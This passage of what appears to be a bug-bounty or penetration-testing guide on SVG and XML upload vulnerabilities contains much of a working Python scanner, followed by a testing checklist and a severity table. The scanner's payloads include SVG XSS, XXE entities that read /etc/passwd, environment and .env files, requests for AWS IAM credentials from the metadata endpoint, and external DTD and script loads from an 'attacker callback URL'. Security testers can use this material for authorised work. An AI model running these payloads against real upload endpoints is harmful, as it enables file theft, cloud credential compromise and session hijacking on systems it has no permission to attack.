            "image_onerror": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="x" onerror="alert(1)" width="100" height="100"/></svg>',
            "rect_onmouseover": '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1000" height="1000" onmouseover="alert(1)"/></svg>',
            "eval_atob": '<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob(\'YWxlcnQoMSk=\'))"></svg>',
            "constructor": '<svg xmlns="http://www.w3.org/2000/svg" onload="[].constructor.constructor(\'alert(1)\')()"></svg>',
            "entity_encoded": '<svg xmlns="http://www.w3.org/2000/svg" onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"></svg>',
            "external_script": f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="{self.callback}/evil.js"/></svg>',
            "css_import": f'<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("{self.callback}/track.css")</style></svg>',
            "fo_iframe": '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="500" height="500"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="javascript:alert(1)"></iframe></body></foreignObject></svg>',
            "fo_img_onerror": '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="500" height="500"><body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)"/></body></foreignObject></svg>',
            "use_data_uri": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\'><script>alert(1)</script></svg>#x"/></svg>',
        }

        for name, payload in xss_payloads.items():
            self.test(name, f"{name}.svg", payload, "image/svg+xml", "xss")

    def run_xxe_tests(self):
        print("\n" + "=" * 60)
        print("  SVG XXE PAYLOAD TESTS")
        print("=" * 60)
        
        xxe_payloads = {
            "xxe_etc_passwd": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
            "xxe_etc_hostname": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
            "xxe_etc_hosts": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
            "xxe_proc_environ": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
            "xxe_env_file": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///var/www/html/.env">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
            "xxe_callback": f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "{self.callback}/xxe-svg-callback">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
            "xxe_external_dtd": f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY % dtd SYSTEM "{self.callback}/evil.dtd">%dtd;]><svg xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100"/></svg>',
            "xxe_php_filter": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
            "xxe_aws_metadata": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
            "xxe_aws_iam": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
            "xxe_localhost": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">&xxe;</text></svg>',
        }

        for name, payload in xxe_payloads.items():
            self.test(name, f"{name}.svg", payload, "image/svg+xml", "xxe")

    def run_ssrf_tests(self):
        print("\n" + "=" * 60)
        print("  SVG SSRF PAYLOAD TESTS (Rendering-based)")
        print("=" * 60)

        ssrf_payloads = {
            "ssrf_image_xlink": f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="{self.callback}/ssrf-image" width="100" height="100"/></svg>',
            "ssrf_image_href": f'<svg xmlns="http://www.w3.org/2000/svg"><image href="{self.callback}/ssrf-href" width="100" height="100"/></svg>',
            "ssrf_stylesheet": f'<?xml-stylesheet type="text/css" href="{self.callback}/ssrf-stylesheet"?><svg xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100"/></svg>',
            "ssrf_css_import": f'<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("{self.callback}/ssrf-css")</style><rect width="100" height="100"/></svg>',
            "ssrf_font_face": f'<svg xmlns="http://www.w3.org/2000/svg"><defs><style>@font-face{{font-family:x;src:url({self.callback}/ssrf-font)}}</style></defs><text font-family="x">t</text></svg>',
            "ssrf_feimage": f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><filter id="f"><feImage xlink:href="{self.callback}/ssrf-feimage"/></filter><rect filter="url(#f)" width="100" height="100"/></svg>',
            "ssrf_use": f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="{self.callback}/ssrf-use#x"/></svg>',
            "ssrf_fo_iframe": f'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="500" height="500"><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="{self.callback}/ssrf-iframe"></iframe></body></foreignObject></svg>',
            "ssrf_fo_img": f'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="500" height="500"><body xmlns="http://www.w3.org/1999/xhtml"><img src="{self.callback}/ssrf-img"/></body></foreignObject></svg>',
            "ssrf_metadata_aws": '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/" width="500" height="500"/></svg>',
        }

        for name, payload in ssrf_payloads.items():
            self.test(name, f"{name}.svg", payload, "image/svg+xml", "ssrf")

    def run_xml_format_tests(self):
        print("\n" + "=" * 60)
        print("  XML-BASED FORMAT XXE TESTS")
        print("=" * 60)
        
        xml_payloads = {
            "xml_basic": ('xxe.xml', f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{self.callback}/xxe-xml">]><root>&xxe;</root>', 'text/xml'),
            "rss_xxe": ('xxe.rss', f'<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "{self.callback}/xxe-rss">]><rss version="2.0"><channel><title>&xxe;</title></channel></rss>', 'application/rss+xml'),
            "atom_xxe": ('xxe.atom', f'<?xml version="1.0"?><!DOCTYPE feed [<!ENTITY xxe SYSTEM "{self.callback}/xxe-atom">]><feed xmlns="http://www.w3.org/2005/Atom"><title>&xxe;</title></feed>', 'application/atom+xml'),
            "xliff_xxe": ('xxe.xlf', f'<?xml version="1.0"?><!DOCTYPE xliff [<!ENTITY xxe SYSTEM "{self.callback}/xxe-xliff">]><xliff version="1.2"><file source-language="en"><body><trans-unit id="1"><source>&xxe;</source></trans-unit></body></file></xliff>', 'application/xliff+xml'),
            "gpx_xxe": ('xxe.gpx', f'<?xml version="1.0"?><!DOCTYPE gpx [<!ENTITY xxe SYSTEM "{self.callback}/xxe-gpx">]><gpx version="1.1" xmlns="http://www.topografix.com/GPX/1/1"><wpt lat="0" lon="0"><name>&xxe;</name></wpt></gpx>', 'application/gpx+xml'),
            "sitemap_xxe": ('xxe_sitemap.xml', f'<?xml version="1.0"?><!DOCTYPE urlset [<!ENTITY xxe SYSTEM "{self.callback}/xxe-sitemap">]><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>&xxe;</loc></url></urlset>', 'application/xml'),
        }

        for name, (filename, payload, mime) in xml_payloads.items():
            self.test(name, filename, payload, mime, "xxe")

    def run_all(self):
        print(f"\nTarget: {self.url}")
        print(f"Callback: {self.callback}")
        print(f"Field: {self.field}")
        
        self.run_xss_tests()
        self.run_xxe_tests()
        self.run_ssrf_tests()
        self.run_xml_format_tests()

        print("\n" + "=" * 60)
        print("  SCAN COMPLETE — RESULTS SUMMARY")
        print("=" * 60)
        print(f"  Total uploaded:     {len(self.results['uploaded'])}")
        print(f"  XSS candidates:     {len(self.results['xss_candidates'])}")
        print(f"  XXE candidates:     {len(self.results['xxe_candidates'])}")
        print(f"  SSRF candidates:    {len(self.results['ssrf_candidates'])}")
        
        if self.results['xss_candidates']:
            print("\n  🔴 XSS Payloads Uploaded:")
            for p in self.results['xss_candidates']:
                print(f"    → {p}")
        
        if self.results['xxe_candidates']:
            print("\n  🔴 XXE Payloads Uploaded:")
            for p in self.results['xxe_candidates']:
                print(f"    → {p}")
        
        if self.results['ssrf_candidates']:
            print("\n  🔴 SSRF Payloads Uploaded:")
            for p in self.results['ssrf_candidates']:
                print(f"    → {p}")

        if self.results['uploaded']:
            print("\n  ⚠️  Check your callback server for incoming requests!")
            print(f"     Callback: {self.callback}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SVG & XML Upload Vulnerability Scanner")
    parser.add_argument("--url", "-u", required=True, help="Upload endpoint URL")
    parser.add_argument("--cookie", "-c", required=True, help="Session cookie string")
    parser.add_argument("--callback", "-cb", required=True, help="Attacker callback URL")
    parser.add_argument("--field", "-f", default="file", help="Form field name")
    parser.add_argument("--upload-dir", "-d", default=None, help="Upload directory URL")
    parser.add_argument("--proxy", "-p", default=None, help="Proxy URL")
    args = parser.parse_args()

    scanner = SVGXMLScanner(args.url, args.cookie, args.callback, args.field, args.upload_dir, args.proxy)
    scanner.run_all()
```
::

---

## Testing Methodology Checklist

::steps{level="4"}

#### Discover Upload Surfaces and Determine SVG/XML Acceptance

```bash
katana -u https://target.com -d 5 -jc | grep -i upload
# Test SVG upload with valid minimal SVG
# Test XML upload with valid minimal XML
# Try alternative MIME types if primary is rejected
```

#### Determine Server Processing Behavior

```bash
# Check Content-Type of served file → XSS vector
# Check if file is parsed server-side → XXE vector
# Check if file is rendered to image → SSRF vector
# Start callback listener before uploading test payloads
```

#### Test SVG XSS Vectors (Client-Side)

```bash
# onload event → <svg onload="alert(1)">
# <script> tag → <script>alert(1)</script>
# foreignObject → HTML/JS injection inside SVG
# animate/set → onbegin/onend event handlers
# <a href="javascript:..."> → Click-based XSS
# Data URI image → Recursive SVG XSS
# Filter bypasses → Entity encoding, eval, constructor
```

#### Test SVG/XML XXE Vectors (Server-Side)

```bash
# file:///etc/passwd entity → Direct file read
# http:// entity → SSRF/callback
# External DTD → Blind/OOB data exfiltration
# php://filter → Base64-encoded file read
# Error-based XXE → Data leak via error messages
# DNS callback → Confirm XXE without data
```

#### Test SSRF via SVG Rendering

```bash
# <image xlink:href="http://internal/"> → Image fetch
# @import url() → CSS fetch
# @font-face src → Font fetch
# feImage filter → Filter primitive fetch
# foreignObject iframe/img → HTML resource fetch
# Cloud metadata endpoints → 169.254.169.254
```

#### Test XML-Based File Format XXE

```bash
# DOCX → [Content_Types].xml injection
# XLSX → [Content_Types].xml / xl/sharedStrings.xml
# PPTX → [Content_Types].xml
# ODT → content.xml
# RSS/Atom/SOAP/XLIFF/GPX/KML → Direct XML XXE
```

#### Verify Impact and Document Findings

```bash
# XSS: Demonstrate cookie theft or account action
# XXE: Show file content or SSRF callback
# SSRF: Show cloud metadata or internal service response
# Calculate CVSS score based on actual impact
# Write detailed reproduction steps
```

::

---

## Severity Assessment

::collapsible
**Impact Classification for SVG & XML Upload Vulnerabilities**

| Attack | Impact | Severity | CVSS Range |
| --- | --- | --- | --- |
| Stored XSS via SVG (same-origin, cookie access) | Account takeover, session hijacking | **High** | 7.0 — 8.5 |
| Stored XSS via SVG (same-origin, no httpOnly cookies) | Cookie theft, data exfiltration | **High** | 6.5 — 8.0 |
| Stored XSS via SVG (cross-origin CDN) | Limited phishing, tracking | **Medium** | 4.0 — 5.5 |
| XSS via SVG in `<img>` context only | No script execution | **Informational** | 0.0 — 2.0 |
| XXE file read (sensitive files) | Data breach, credential theft | **Critical** | 8.5 — 9.8 |
| XXE file read (non-sensitive files) | Information disclosure | **High** | 6.0 — 7.5 |
| Blind XXE with OOB exfiltration | Data exfiltration | **High — Critical** | 7.5 — 9.0 |
| XXE SSRF to cloud metadata | Cloud account compromise | **Critical** | 9.0 — 10.0 |
| SSRF via SVG rendering (internal port scan) | Internal network reconnaissance | **Medium — High** | 5.0 — 7.0 |
| SSRF via SVG rendering (cloud metadata) | Cloud credential theft | **Critical** | 9.0 — 10.0 |
| SSRF via SVG rendering (callback only) | Confirms server-side processing | **Low — Medium** | 3.0 — 5.0 |
| XML bomb / SVG DoS | Service disruption | **Medium** | 4.0 — 6.0 |
| DOCX/XLSX/PPTX XXE | File read, SSRF from document processing | **High — Critical** | 7.0 — 9.5 |
::